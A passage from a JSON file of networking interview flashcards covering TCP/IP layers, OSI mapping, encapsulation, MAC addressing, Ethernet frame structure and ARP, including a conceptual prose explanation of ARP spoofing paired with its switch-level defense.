          "correct": "Some textbooks split the bottom layer into Physical + Data Link (5-layer pedagogical model), but standard TCP/IP is 4 layers."
        },
        {
          "wrong": "TCP/IP requires TCP for every single connection.",
          "why": "Applications can choose UDP (or SCTP/QUIC) instead of TCP.",
          "correct": "The 'TCP/IP' name refers to the suite; DNS and video streaming frequently use UDP over IP."
        },
        {
          "wrong": "TCP/IP guarantees zero packet loss at the Internet layer.",
          "why": "The IP layer is strictly 'best-effort' and unacknowledged.",
          "correct": "Reliability is provided by TCP at the Transport layer above IP, not by IP itself."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why did the TCP/IP model succeed in the marketplace while the OSI model remained largely academic?",
          "a": "TCP/IP was developed with an 'implementation-first' pragmatic philosophy (running code and rough consensus through IETF RFCs). It was integrated for free into BSD Unix in 1983, allowing university and military researchers to immediately interconnect machines. In contrast, the OSI standards were committee-driven, overly complex (Session and Presentation layers had weak justification), and too slow to market.",
          "tip": "Quoting RFC culture ('rough consensus and running code') always impresses interviewers."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Application (L4) -> Transport (L3) -> Internet (L2) -> Network Interface (L1).",
        "summaryPoints": [
          "4 practical layers: Application, Transport, Internet, Network Interface.",
          "IP provides connectionless, best-effort packet delivery across networks.",
          "TCP provides connection-oriented, reliable, ordered byte streams.",
          "Implemented natively inside the OS kernel network stack."
        ],
        "whenToUse": "The architecture governing all real-world socket programming, cloud services, and Internet traffic."
      }
    }
  ],
  "osi-vs-tcp-ip": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is OSI vs TCP/IP Model Comparison?",
      "inSimpleWords": "A direct architectural comparison between the 7-layer theoretical OSI reference model and the 4-layer practical TCP/IP protocol suite.",
      "analogy": "OSI is a 7-step formal culinary textbook separating slicing, seasoning, and tasting; TCP/IP is the chef in a fast-paced restaurant kitchen executing the dish in 4 pragmatic steps.",
      "diagramType": "osi-model"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need OSI vs TCP/IP Model Comparison?",
      "problem": "Engineers talking across disciplines use OSI layer terminology (e.g. 'Layer 4 Load Balancer', 'Layer 7 WAF') while writing code for TCP/IP systems, creating conceptual confusion.",
      "whyItMatters": "Interviewers frequently test whether candidates understand layer mappings, protocol locations, and the trade-offs between clean abstraction and performance overhead.",
      "howSolves": "Mapping OSI Layers 5, 6, and 7 to TCP/IP Application layer clarifies where functionality belongs in software vs the kernel."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does OSI vs TCP/IP Model Comparison work?",
      "steps": [
        {
          "step": 1,
          "title": "Application Mapping",
          "desc": "OSI L7 (App), L6 (Presentation), L5 (Session) map directly to TCP/IP Application layer."
        },
        {
          "step": 2,
          "title": "Transport Mapping",
          "desc": "OSI L4 maps 1:1 to TCP/IP Transport layer (TCP/UDP process-to-process delivery)."
        },
        {
          "step": 3,
          "title": "Network Mapping",
          "desc": "OSI L3 maps 1:1 to TCP/IP Internet layer (IP addressing & hop routing)."
        },
        {
          "step": 4,
          "title": "Link Mapping",
          "desc": "OSI L2 (Data Link) and L1 (Physical) map to TCP/IP Network Interface layer."
        }
      ],
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "OSI L7/L6/L5": "Application, Presentation, Session <--> TCP/IP Application Layer",
        "OSI L4": "Transport Layer <--> TCP/IP Transport Layer (TCP, UDP)",
        "OSI L3": "Network Layer <--> TCP/IP Internet Layer (IP, ICMP, ARP)",
        "OSI L2/L1": "Data Link & Physical <--> TCP/IP Network Interface / Link Layer"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A cloud engineer configures an AWS Application Load Balancer (ALB) and a Network Load Balancer (NLB).",
      "challenge": "What does AWS mean by calling ALB a 'Layer 7' device and NLB a 'Layer 4' device?",
      "resolution": "ALB inspects HTTP headers, cookies, and URL paths (OSI L7); NLB routes purely based on TCP/UDP ports and IP addresses (OSI L4 / TCP/IP Transport).",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Layer 7 Device": "Reverse Proxy (NGINX), WAF (Cloudflare), API Gateway",
        "Layer 4 Device": "Network Load Balancer (AWS NLB), Linux IPVS, HAProxy (TCP mode)",
        "Layer 3 Device": "IP Router, Layer 3 Switch (Cisco Catalyst)",
        "Layer 2 Device": "Standard Ethernet Switch, Wi-Fi Access Point"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for OSI vs TCP/IP Model Comparison. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Presentation and Session layers do not exist in TCP/IP applications.",
          "why": "The functionality still exists; it is just handled by user libraries rather than separate kernel layers.",
          "correct": "In TCP/IP, presentation (TLS encryption, JSON serialization) is implemented directly inside the application layer."
        },
        {
          "wrong": "OSI came first, and then TCP/IP was invented to replace it.",
          "why": "ARPANET and TCP/IP protocols were designed in the early 1970s; OSI was standardized in 1984.",
          "correct": "TCP/IP protocols were already running on ARPANET before the ISO formalized the OSI model."
        },
        {
          "wrong": "A Layer 4 load balancer can inspect URL paths.",
          "why": "Layer 4 operates strictly on TCP/UDP ports and IP addresses; it has no visibility into HTTP payload strings.",
          "correct": "URL path inspection requires a Layer 7 proxy that terminates the TCP connection and decrypts TLS."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between an OSI Layer 4 Load Balancer and a Layer 7 Load Balancer?",
          "a": "A Layer 4 Load Balancer routes traffic based on network and transport layer headers (Source IP, Destination IP, Port) without inspecting the application payload. It makes routing decisions on the initial TCP SYN packet, providing extremely high throughput and low CPU overhead. A Layer 7 Load Balancer terminates the TCP connection, decrypts SSL/TLS, and parses application data (HTTP headers, URL paths, cookies). It enables intelligent content routing (e.g. /api -> backend microservice, /static -> CDN), but incurs higher CPU and memory overhead.",
          "tip": "Draw the comparison table: L4 = fast, packet-level, no decryption; L7 = smart, content-level, SSL termination."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "OSI 7 layers = conceptual reference; TCP/IP 4 layers = real software implementation.",
        "summaryPoints": [
          "OSI L5-L7 are merged into TCP/IP Application layer.",
          "OSI L1-L2 are merged into TCP/IP Network Interface layer.",
          "L4 switches/LBs route by IP + Port; L7 proxies route by HTTP URL/Headers.",
          "OSI provides strict boundary separation; TCP/IP allows protocol optimization across layers."
        ],
        "whenToUse": "Crucial for system design interviews, load balancer selection, and network troubleshooting."
      }
    }
  ],
  "encapsulation-decapsulation": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Encapsulation & Decapsulation?",
      "inSimpleWords": "Encapsulation is the process where each layer on the sender wraps payload data from the layer above with its own protocol control header. Decapsulation is the reverse unpacking process on the receiver.",
      "analogy": "Like Russian nesting dolls (Matryoshka) or mailing a letter: Document -> Envelope with stamp -> Courier pouch -> Mail truck cargo container. Recipient cuts open container -> pouch -> envelope -> reads letter.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Encapsulation & Decapsulation?",
      "problem": "A physical wire transmitting electrical bits has no intrinsic meaning unless data carries structured metadata indicating its sender, destination, protocol, and integrity.",
      "whyItMatters": "Encapsulation ensures modularity: the Network layer does not need to know what application generated the data, only the destination IP address.",
      "howSolves": "Headers act as layer-specific contracts. Each layer processes its own header and discards it before passing payload up to the next layer."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Encapsulation & Decapsulation work?",
      "steps": [
        {
          "step": 1,
          "title": "Application PDU (Data)",
          "desc": "HTTP payload: GET /index.html HTTP/1.1 generated by browser."
        },
        {
          "step": 2,
          "title": "Transport PDU (Segment)",
          "desc": "TCP prepends 20-byte header: Source Port 52000, Dest Port 443, Seq=100."
        },
        {
          "step": 3,
          "title": "Network PDU (Packet)",
          "desc": "IP prepends 20-byte header: Src IP 192.168.1.5, Dest IP 142.250.72.14, TTL=64."
        },
        {
          "step": 4,
          "title": "Data Link PDU (Frame)",
          "desc": "Ethernet prepends 14-byte MAC header and appends 4-byte CRC trailer (FCS)."
        }
      ],
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Data (L7-L5)": "User payload string or JSON object",
        "Segment (L4)": "[TCP Header (20B)] + [Data]",
        "Packet (L3)": "[IP Header (20B)] + [TCP Header] + [Data]",
        "Frame (L2)": "[MAC Header (14B)] + [IP Header] + [TCP Header] + [Data] + [CRC Trailer (4B)]",
        "Bits (L1)": "Physical electrical / optical signal encoding"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A user clicks 'Checkout' on an e-commerce website, sending an encrypted credit card token.",
      "challenge": "The packet must navigate 12 intermediate ISP routers that speak different link-layer technologies (Ethernet, MPLS, Wi-Fi).",
      "resolution": "Each router strips the L2 Frame header, inspects the L3 IP destination, selects the outgoing port, and wraps the IP packet in a brand new L2 Frame header for the next hop.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Original Payload": "POST /checkout HTTP/1.1 (250 bytes)",
        "TCP Segment Size": "250 + 20 = 270 bytes",
        "IP Packet Size": "270 + 20 = 290 bytes",
        "Ethernet Frame Size": "290 + 14 + 4 = 308 bytes total on wire",
        "Protocol Overhead": "18.8% header overhead"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Encapsulation & Decapsulation (PDU Lifecycle). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "The IP header changes at every router hop.",
          "why": "Source IP and Destination IP remain unchanged end-to-end across the Internet (unless traversing a NAT gateway).",
          "correct": "The L2 MAC header changes at EVERY router hop; the L3 IP header remains constant end-to-end (except TTL decrement)."
        },
        {
          "wrong": "Encapsulation only adds headers at the beginning of data.",
          "why": "The Data Link layer also appends a Frame Check Sequence (FCS) trailer at the END of the frame for CRC error detection.",
          "correct": "Data Link adds BOTH a header at the start and a trailer at the end."
        },
        {
          "wrong": "Decapsulation happens on all routers along the path up to Layer 7.",
          "why": "Intermediate routers only decapsulate up to Layer 3 (IP).",
          "correct": "Intermediate routers decapsulate L2, read L3, and re-encapsulate L2; only the destination host decapsulates up to Layer 7."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "As an IP packet travels across three routers from Host A to Host B, which headers change at each hop and which stay the same?",
          "a": "At each router hop: 1. The Layer 2 Data Link (Ethernet) Frame header is completely stripped and replaced with a new Source MAC (the router's egress interface) and Destination MAC (the next hop router or host). 2. The Layer 3 IP header remains constant end-to-end (Source IP and Destination IP do NOT change, assuming no NAT), with the exception of the TTL field (decremented by 1) and the IP Header Checksum (recalculated). 3. The Layer 4 Transport header and Layer 7 Application payload are never touched by intermediate routers.",
          "tip": "Emphasize: 'MAC addresses are hop-by-hop local; IP addresses are end-to-end global.' This is a classic placement gold question."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Sender: Data -> Segment (L4) -> Packet (L3) -> Frame (L2) -> Bits (L1). Receiver: reverse decapsulation.",
        "summaryPoints": [
          "Encapsulation adds headers top-down; Decapsulation strips headers bottom-up.",
          "MAC addresses change at every single router hop (link-local).",
          "IP addresses remain intact end-to-end (unless modified by NAT).",
          "Frame trailer contains 32-bit CRC / FCS to verify physical integrity before decapsulation."
        ],
        "whenToUse": "Fundamental for packet capture analysis (Wireshark), router debugging, and network latency optimization."
      }
    }
  ],
  "mac-address": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is MAC Addressing?",
      "inSimpleWords": "A Media Access Control (MAC) address is a unique, 48-bit (6-byte) physical identifier permanently burned into the Read-Only Memory of a Network Interface Card (NIC).",
      "analogy": "Like your biological fingerprint or DNA: permanently bound to your physical body (NIC) regardless of what city (IP subnet) you move to.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need MAC Addressing?",
      "problem": "If two computers on the same local Wi-Fi router share the same IP or if IPs change via DHCP, switches need an unalterable hardware address to deliver electrical frames.",
      "whyItMatters": "Layer 2 Ethernet switches operate exclusively on MAC addresses. Without MAC addressing, local multi-access framing on shared copper or Wi-Fi radio frequencies is impossible.",
      "howSolves": "Every NIC manufacturer is assigned an IEEE Organizationally Unique Identifier (OUI), guaranteeing global physical uniqueness for every manufactured network chip."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does MAC Addressing work?",
      "steps": [
        {
          "step": 1,
          "title": "OUI Assignment",
          "desc": "IEEE assigns first 24 bits (3 bytes) to vendor (e.g., Apple, Intel, Cisco)."
        },
        {
          "step": 2,
          "title": "NIC Serialization",
          "desc": "Vendor assigns remaining 24 bits (3 bytes) as unique serial number."
        },
        {
          "step": 3,
          "title": "Burned-In Address (BIA)",
          "desc": "Laser-etched into NIC ROM during silicon fabrication."
        },
        {
          "step": 4,
          "title": "Frame Addressing",
          "desc": "Ethernet frames stamp Source MAC and Destination MAC into L2 header."
        }
      ],
      "vfxType": "switching"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Total Size": "48 bits = 6 bytes = 12 hexadecimal characters",
        "Format": "XX:XX:XX:YY:YY:YY or XX-XX-XX-YY-YY-YY",
        "OUI (First 3 Bytes)": "Vendor code (e.g. 00:0C:29 = VMware, AC:DE:48 = Apple)",
        "NIC (Last 3 Bytes)": "Device specific unique hardware identifier",
        "Broadcast MAC": "FF:FF:FF:FF:FF:FF (all 48 bits set to 1)"
      },
      "diagramType": "ethernet-frame"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A laptop connects to office Wi-Fi, then drives to a coffee shop and connects to public Wi-Fi.",
      "challenge": "Its IP address changes from 10.0.1.45 (office) to 192.168.1.80 (coffee shop). How does the local network recognize its network card?",
      "resolution": "Its MAC address (A4:5E:60:12:AB:9C) remains identical on both networks, allowing local Layer 2 switches to maintain frame delivery.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Example MAC": "A4:5E:60:12:AB:9C",
        "OUI Prefix": "A4:5E:60 (Apple Inc.)",
        "Device Identifier": "12:AB:9C",
        "Broadcast MAC": "FF:FF:FF:FF:FF:FF",
        "Multicast MAC": "01:00:5E:00:00:01 (IPv4 Multicast prefix)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for MAC Addressing (Physical 48-bit Hardware Address). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A MAC address is routable across the public Internet.",
          "why": "MAC addresses are link-local only. Routers discard the incoming L2 MAC header when forwarding to the next hop.",
          "correct": "MAC addresses only have significance within a single local Layer 2 broadcast domain."
        },
        {
          "wrong": "MAC addresses can never be changed under any circumstances.",
          "why": "While the physical BIA in ROM is fixed, operating system drivers allow MAC spoofing in software.",
          "correct": "Software can spoof the MAC address reported by the OS network stack, although the burned-in ROM address remains."
        },
        {
          "wrong": "A device with 2 network cards (Wi-Fi and Ethernet) has 1 MAC address.",
          "why": "MAC addresses belong to individual network interface controllers (NICs), not the computer motherboard.",
          "correct": "Each physical or virtual network interface has its own distinct MAC address."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why do we need both MAC addresses and IP addresses? Why can't we use just one?",
          "a": "MAC addresses and IP addresses serve fundamentally different architectural purposes. A MAC address is a flat, non-hierarchical 48-bit identifier identifying a physical hardware interface on a local link. If the global Internet ran on MAC addresses, core internet routers would need routing tables with billions of individual entries (one for every device on Earth), causing immediate memory exhaustion and routing collapse. In contrast, IP addresses are hierarchical (Network ID + Host ID), allowing routers to aggregate millions of hosts into a single route prefix (e.g. /16 or /24). Conversely, we cannot use only IP addresses because hosts frequently join networks without an IP (DHCP requires MAC to assign an IP), and IP addresses change whenever a host moves networks.",
          "tip": "Use the analogy: 'MAC address is your Social Security Number / Aadhaar (who you are); IP address is your postal mailing address (where you currently live).'"
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "MAC = 48-bit physical flat address (OUI 24b + NIC 24b); link-local only.",
        "summaryPoints": [
          "48 bits formatted as 6 hex octets (e.g. A4:5E:60:12:AB:9C).",
          "First 3 bytes = Organizationally Unique Identifier (OUI) assigned by IEEE.",
          "Last 3 bytes = Vendor-assigned unique serial number.",
          "Broadcast MAC is FF:FF:FF:FF:FF:FF; received and processed by every NIC in the VLAN."
        ],
        "whenToUse": "Essential for understanding Layer 2 switching, ARP resolution, and Wireshark frame inspection."
      }
    }
  ],
  "ethernet-frames": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Ethernet & Frame Structure?",
      "inSimpleWords": "An Ethernet frame is the standardized Layer 2 Protocol Data Unit (IEEE 802.3) used to transmit data across wired local area networks.",
      "analogy": "An armored bank courier envelope: has sender and receiver names stamped on the outside, a tamper-evident seal (CRC) at the bottom, and carries the cash payload inside.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Ethernet & Frame Structure?",
      "problem": "Raw physical voltage pulses on a copper wire can suffer electromagnetic noise interference, bit flips, or framing synchronization loss.",
      "whyItMatters": "Ethernet is the dominant Layer 2 wired networking standard worldwide, powering data centers, campuses, home routers, and internet exchange points.",
      "howSolves": "Ethernet defines preambles for clock synchronization, address fields for switching, an EtherType field for protocol demultiplexing, and a 32-bit CRC checksum for error detection."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Ethernet & Frame Structure work?",
      "steps": [
        {
          "step": 1,
          "title": "Preamble (7 Bytes)",
          "desc": "Alternating pattern of 10101010 allowing receiver clock to synchronize with incoming bit stream."
        },
        {
          "step": 2,
          "title": "SFD (1 Byte)",
          "desc": "Start Frame Delimiter (10101011). Last two 1s signal that the destination MAC starts on the next bit."
        },
        {
          "step": 3,
          "title": "MAC Addressing (12 Bytes)",
          "desc": "Destination MAC (6B) followed by Source MAC (6B)."
        },
        {
          "step": 4,
          "title": "EtherType (2 Bytes)",
          "desc": "Identifies encapsulated L3 protocol: 0x0800 for IPv4, 0x86DD for IPv6, 0x0806 for ARP."
        },
        {
          "step": 5,
          "title": "Payload (46 - 1500 Bytes)",
          "desc": "The encapsulated IP packet. Minimum 46 bytes (padded with zeros if smaller) up to 1500 bytes MTU."
        },
        {
          "step": 6,
          "title": "FCS / CRC (4 Bytes)",
          "desc": "Frame Check Sequence. 32-bit cyclic redundancy check. If computed CRC does not match, frame is dropped immediately."
        }
      ],
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Preamble + SFD": "8 Bytes (Synchronization & start delimiter)",
        "Destination MAC": "6 Bytes (Target NIC)",
        "Source MAC": "6 Bytes (Sender NIC)",
        "EtherType / Length": "2 Bytes (0x0800 IPv4, 0x0806 ARP, 0x86DD IPv6)",
        "Payload": "46 to 1500 Bytes (Standard Ethernet MTU)",
        "FCS (CRC)": "4 Bytes (Error detection trailer)"
      },
      "diagramType": "ethernet-frame"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A 10-byte ICMP Echo Request needs to be transmitted over an Ethernet link.",
      "challenge": "Ethernet requires a minimum frame size of 64 bytes for collision detection (CSMA/CD on half-duplex links).",
      "resolution": "The network interface automatically pads 36 zero bytes to the payload, ensuring the frame meets the 64-byte minimum length.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Minimum Frame Size": "64 bytes (14 header + 46 payload + 4 CRC)",
        "Maximum Frame Size": "1518 bytes (14 header + 1500 payload + 4 CRC)",
        "Jumbo Frame": "Up to 9000 bytes (used in enterprise storage SANs)",
        "EtherType IPv4": "0x0800",
        "EtherType ARP": "0x0806"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Ethernet & Frame Structure (802.3). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Ethernet retransmits frames automatically when the CRC checksum fails.",
          "why": "Ethernet detects errors; it does NOT correct or retransmit them.",
          "correct": "Ethernet silently drops corrupted frames. Retransmission is left to upper layers like TCP."
        },
        {
          "wrong": "Maximum Transmission Unit (MTU) includes the Ethernet header.",
          "why": "MTU refers strictly to the maximum PAYLOAD size that fits inside the frame (1500 bytes by default).",
          "correct": "MTU is 1500 bytes (payload); total frame size on the wire is 1518 bytes (or 1522 with 802.1Q VLAN tag)."
        },
        {
          "wrong": "Preamble is counted in the 64-byte minimum frame size.",
          "why": "Preamble and SFD are physical layer framing overhead.",
          "correct": "The 64-byte minimum counts from Destination MAC to FCS trailer."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why does Ethernet enforce a minimum frame size of 64 bytes?",
          "a": "The minimum frame size of 64 bytes was mandated by Ethernet's CSMA/CD (Carrier Sense Multiple Access with Collision Detection) protocol. In a shared half-duplex coaxial collision domain (up to 2.5 km with repeaters), a sender must transmit for at least the round-trip propagation time (slot time = 51.2 microseconds at 10 Mbps) to ensure that if a collision occurs at the furthest end of the cable, the collision signal travels back before the sender finishes transmitting. At 10 Mbps, 51.2 microseconds equals exactly 512 bits = 64 bytes. If a frame were smaller (a 'runt'), the sender might finish transmitting and assume success before the collision fragment returned.",
          "tip": "Mention slot time, CSMA/CD, and runt frames when answering this classic question."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Standard Ethernet: Min 64 bytes, Max 1518 bytes (MTU 1500 bytes). Dropped if CRC fails.",
        "summaryPoints": [
          "Frame format: Dest MAC (6B) + Src MAC (6B) + EtherType (2B) + Payload (46-1500B) + FCS (4B).",
          "EtherType determines upper protocol: 0x0800 (IPv4), 0x0806 (ARP), 0x86DD (IPv6).",
          "FCS uses CRC-32 to detect errors; corrupted frames are discarded without ACK/NACK.",
          "802.1Q adds a 4-byte VLAN tag between Source MAC and EtherType."
        ],
        "whenToUse": "Essential for understanding MTU fragmentation, Wireshark frame analysis, and network interface configuration."
      }
    }
  ],
  "arp-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is ARP?",
      "inSimpleWords": "Address Resolution Protocol (ARP, RFC 826) dynamically resolves a known Layer 3 logical IP address to an unknown Layer 2 physical MAC address on a local network segment.",
      "analogy": "In an office meeting room, shouting: 'Whoever is John Doe (IP), please tell me your physical badge number (MAC)!' John speaks up: 'I am John Doe, my badge number is 42.'",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need ARP?",
      "problem": "When Host A wants to send an IP packet to Host B on the same LAN, it knows Host B's IP address, but its network card cannot transmit an Ethernet frame without Host B's destination MAC address.",
      "whyItMatters": "Without ARP, no computer could communicate over local Ethernet or Wi-Fi networks.",
      "howSolves": "Host A broadcasts an ARP Request (Who has 192.168.1.50? Tell 192.168.1.10). Host B hears the broadcast and unicasts back an ARP Reply containing its MAC address."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does ARP work?",
      "steps": [
        {
          "step": 1,
          "title": "ARP Cache Lookup",
          "desc": "Sender checks local OS ARP cache table. If entry exists, frames transmit immediately without network overhead."
        },
        {
          "step": 2,
          "title": "ARP Request Broadcast",
          "desc": "If entry missing, sender crafts ARP Request frame with Dest MAC FF:FF:FF:FF:FF:FF. Every switch port floods this broadcast."
        },
        {
          "step": 3,
          "title": "Target Unicast Reply",
          "desc": "All hosts receive request; only the host matching target IP responds. It sends unicast ARP Reply directly to sender MAC."
        },
        {
          "step": 4,
          "title": "ARP Cache Storage",
          "desc": "Sender stores target IP -> MAC mapping in ARP table with an expiration TTL (typically 2 to 20 minutes)."
        }
      ],
      "vfxType": "switching"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Hardware Type": "0x0001 (Ethernet)",
        "Protocol Type": "0x0800 (IPv4)",
        "Hardware / Proto Size": "6 bytes (MAC length), 4 bytes (IP length)",
        "Opcode": "1 = ARP Request, 2 = ARP Reply",
        "Sender MAC / IP": "Source host physical MAC and logical IP",
        "Target MAC / IP": "Target physical MAC (00:00:00:00:00:00 in request) and target IP"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "PC A (192.168.1.10) wants to ping PC B (192.168.1.20) for the very first time after booting.",
      "challenge": "PC A has no entry for 192.168.1.20 in its ARP cache. The ICMP Echo Request is held in memory buffer.",
      "resolution": "PC A transmits an ARP request broadcast. PC B responds with its MAC 3C:52:82:11:22:33 within 1 ms. PC A stores it and immediately transmits the pending ping.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Command Windows/Linux": "arp -a (displays cached IP-to-MAC bindings)",
        "Gratuitous ARP": "Host broadcasts its own IP/MAC on boot to detect duplicate IPs",
        "ARP Cache Timeout": "Entries expire after 120 - 300 seconds of inactivity to handle replaced NICs"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for ARP (Address Resolution Protocol) & Cache. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "switching"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "ARP is used to resolve remote Internet websites like google.com to a MAC address.",
          "why": "ARP is strictly link-local. You cannot ARP a remote public IP.",
          "correct": "To reach google.com, the host uses ARP to find the MAC address of its DEFAULT GATEWAY router, not Google's server."
        },
        {
          "wrong": "ARP runs over UDP or TCP.",
          "why": "ARP does not use transport layer protocols.",
          "correct": "ARP operates directly on top of the Data Link layer (EtherType 0x0806)."
        },
        {
          "wrong": "ARP Replies are broadcast to the whole network.",
          "why": "The target already learned the sender's MAC from the request.",
          "correct": "ARP Requests are broadcast (FF:FF:FF:FF:FF:FF); ARP Replies are UNICAST directly to the requester."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is ARP Spoofing (ARP Poisoning) and how does an attacker execute a Man-in-the-Middle (MITM) attack with it?",
          "a": "ARP is stateless and does not authenticate replies; hosts will blindly update their ARP cache whenever they receive an ARP Reply, even if they never sent a request. In an ARP Spoofing attack, an attacker on the same LAN sends unsolicited (gratuitous) fake ARP replies to the Victim host claiming: 'I have the Default Gateway IP' (binding Gateway IP to Attacker MAC), and sends fake replies to the Router claiming: 'I have the Victim IP' (binding Victim IP to Attacker MAC). All bidirectional internet traffic between the victim and gateway now routes through the attacker's machine, allowing packet sniffing and session hijacking.",
          "tip": "Mention Dynamic ARP Inspection (DAI) on managed switches as the enterprise defense against ARP spoofing."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "ARP resolves IP -> MAC. Request is Broadcast (FF:FF:FF:FF:FF:FF); Reply is Unicast.",
        "summaryPoints": [
          "ARP Request: L2 Broadcast to discover who owns an IP on the local subnet.",
          "ARP Reply: L2 Unicast returning the physical MAC address.",
          "Operating system caches bindings in ARP table (`arp -a`).",
          "To reach outside the subnet, host ARPs for the Default Gateway router's MAC."
        ],
        "whenToUse": "Crucial for network troubleshooting, default gateway connectivity, and security audits."
      }
    }
  ],
  "switching-mac-table": [
    {
